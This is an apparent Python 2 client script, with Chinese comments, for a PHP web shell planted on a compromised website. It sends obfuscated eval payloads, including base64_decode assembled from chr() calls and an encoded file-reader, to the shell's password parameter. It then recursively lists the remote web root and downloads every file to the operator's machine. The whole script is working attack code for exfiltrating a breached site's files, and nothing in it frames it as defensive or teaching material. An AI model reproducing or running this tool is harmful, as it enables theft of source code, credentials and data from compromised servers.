#/usr/bin/env python
#coding: gbk
import re
import random
import requests 
import os
import sys

def sub_path(path):#将传入的path处理成只有斜杠
    return re.sub('\\\\', '/', path).rstrip('/')

def get_directory(path):#获取当前的目录
    try:
        list = path.strip('/').split('/')
        if list[len(list) - 1] != '':
            return list[len(list) - 1]
        else:
            return str(int(random.random()*1000000))
    except Exception,e:
        print Exception,":",e
        exit()
        return str(int(random.random()*1000000))

def get_content(path, url, pwd):#获取远程文件的内容
    try:
        content = requests.post(url, data={'sss':'$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/($xx/**/($yy[z0]));','z0':'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7','z1':path}).content.lstrip('->|').rstrip('|<-')
        return content
    except Exception,e:
        print Exception,":",e
        exit()
        return ''

def create(path, dict=False, content = ""):#本地创建文件或目录
    now = sub_path(os.getcwd())
    path = now + '/' + path
    if os.path.exists(path):
        if os.path.isfile(path):
            answer = raw_input(path + ': The file already exists, do you want to rewrite it?(YES/no)')
            if answer == 'no' or answer == 'NO':
                return True
        else:
            return True
    try:
        if dict:
            os.mkdir(path)
            return True
        else:
            print path
            f = open(path, 'wb')
            f.write(content)
            f.close()
            return True
    except Exception,e:
        print Exception,":",e
        exit()
        return False

def is_dir(path, url, pwd):#判断远程路径是文件夹还是目录
    res = requests.post(url, data = {pwd:'echo is_dir("%s");' % path}).content
    if res == '1':
        return True
    else:
        return False
        
def walk(root, path, url, pwd):#遍历目录
    res = requests.post(url, data = {pwd:'print_r(scandir("%s"));' % (root + '/' + path)}).content
    list = re.findall(' => (.*)', res)
    if len(list) > 2:
        for target in list:
            if target != '.' and target != '..':
                path_tmp = path + '/' + target
                if is_dir(root+'/'+path_tmp, url, pwd):
                    create(path_tmp, dict=True)
                    walk(root, path_tmp, url,  pwd)
                else:
                    content = get_content(root+'/'+path_tmp, url, pwd)
                    create(path=path_tmp, content=content)
        return
        
if __name__ == '__main__':
    if len(sys.argv) == 4:
        url = sys.argv[1]
        pwd = sys.argv[2]
        path = sys.argv[3]
    elif len(sys.argv) == 3:
        url = sys.argv[1]
        pwd = sys.argv[2]
        path = requests.post(url, data = {pwd: "echo $_SERVER[\"DOCUMENT_ROOT\"];"}).content
    else:
        print "wrong args:"
        print "example:"
        print '     datacopy.py    http://www.exmaple.com/1.php    password     webpath(the web path you want to down, null means path of site)'
        exit()
    path = sub_path(path)
    root = path.strip(get_directory(path)).rstrip('/')
    path = get_directory(path)
    create(path, dict=True)
    walk(root, path, url, pwd)
